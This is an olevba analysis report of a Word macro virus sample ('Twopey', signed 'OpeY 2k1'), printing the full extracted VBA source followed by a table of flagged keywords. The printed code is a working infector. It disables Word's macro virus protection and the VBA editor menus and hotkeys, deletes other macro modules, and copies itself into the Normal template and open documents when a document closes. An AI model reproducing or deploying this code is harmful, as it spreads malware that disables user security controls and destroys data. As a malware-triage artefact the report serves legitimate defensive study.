olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twopey-d8a10ca3f3befe7a36b17c7b5170064eee7684cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twopey-d8a10ca3f3befe7a36b17c7b5170064eee7684cf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Opey2k1() '[BLOOD-HOUND ESCAPE]
On Error Resume Next
OpeyStrt = Options.DefaultFilePath(wdStartupPath)
Transitionfile = OpeyStrt & "\system.txt"
With CommandBars("Tools")
.Reset
.Controls("Macro").Reset
.Controls("Templates and Add-Ins...").Reset
.Controls("Customize...").Reset
End With
For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
themodules = NormalTemplate.VBProject.VBComponents(i).Name
If (themodules <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next i
For Each opendoc In Documents
With opendoc
For j = opendoc.VBProject.VBComponents.Count To 1 Step -1
themodules = opendoc.VBProject.VBComponents(j).Name
If (themodules <> "ThisDocument") And (themodules <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=themodules, Object:=wdOrganizerObjectProjectItems
Next j
End With
Next opendoc
Application.ShowVisualBasicEditor = False
Application.DisplayAlerts = wdAlertsNone
ActiveDocument.ReadOnlyRecommended = False
With Dialogs(wdDialogFileSummaryInfo)
.Author = "OPEY A." 'GREETINGS TO ALL FILIPINO PROGRAMMERS !!!
.Title = "OpeY 2k1 version - Philippines"
.Execute
End With
With Options
.ConfirmConversions = True
.VirusProtection = False
.SaveNormalPrompt = False
End With
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
opey = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 75)
If Dir(Transitionfile) = True Then Kill Transitionfile
Open Transitionfile For Output Shared As #1
Print #1, opey
Close #1
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("Opey", 1, 1, 10, 10) = False Then
numberoflines = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Opey", 1, 1, 10, 10) = False Then
numberoflines = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, numberoflines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile Transitionfile
ActiveDocument.Save
End If
Kill Transitionfile
End Sub
Private Sub Document_Close()
On Error Resume Next
If ActiveDocument.Undo = False And ActiveDocument.Redo = False Then
ActiveDocument.Close
Exit Sub
End If
Call Opey2k1
End Sub
Private Sub Document_Open()
On Error Resume Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

